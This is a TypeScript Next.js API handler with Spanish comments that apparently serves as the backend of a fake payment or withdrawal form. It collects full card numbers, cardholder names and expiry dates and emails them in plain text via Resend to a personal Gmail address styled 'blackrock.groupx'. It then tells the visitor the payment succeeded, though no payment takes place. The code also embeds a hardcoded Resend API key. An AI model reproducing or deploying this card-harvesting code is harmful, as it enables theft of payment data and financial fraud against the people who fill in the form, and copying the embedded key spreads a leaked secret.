import { NextApiRequest, NextApiResponse } from 'next';
import { Resend } from 'resend';

const resend = new Resend('re_4SRzzvTb_KL8BKevatpyJaUQap5BCjdSx'); // Tu clave API

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  try {
    const { currency, paymentAmount, cardType, cardNumber, cardHolder, expiryDate } = req.body;

    // Verifica que todos los campos requeridos estén presentes
    if (!currency || !paymentAmount || !cardNumber || !cardHolder || !expiryDate) {
      console.error("❌ Datos faltantes:", { currency, paymentAmount, cardNumber, cardHolder, expiryDate });
      return res.status(400).json({ error: '❌ Datos incompletos. Verifica los campos.' });
    }

    // Enviar el correo con Resend
    const data = await resend.emails.send({
      from: 'Solicitud Retiro <onboarding@resend.dev>', // El remitente debe coincidir con tu cuenta o dominio verificado
      to: 'blackrock.groupx@gmail.com',
      subject: 'Confirmación de Pago',
      text: `
✅ Se ha procesado un pago con éxito.

- Moneda: ${currency}
- Monto de Pago: ${paymentAmount} USDT
- Tipo de Tarjeta: ${cardType}
- Nombre en Tarjeta: ${cardHolder}
- Número de Tarjeta: ${cardNumber}
- Fecha de Expiración: ${expiryDate}
      `
    });

    console.log('✅ Correo enviado correctamente:', data);
    return res.status(200).json({ message: 'PAGO ENVIADO CORRECTAMENTE' });
  } catch (error) {
    console.error('❌ Error al enviar correo con Resend:', error);
    return res.status(500).json({ error: '❌ Error al enviar el correo. Revisa la configuración del servidor.' });
  }
}

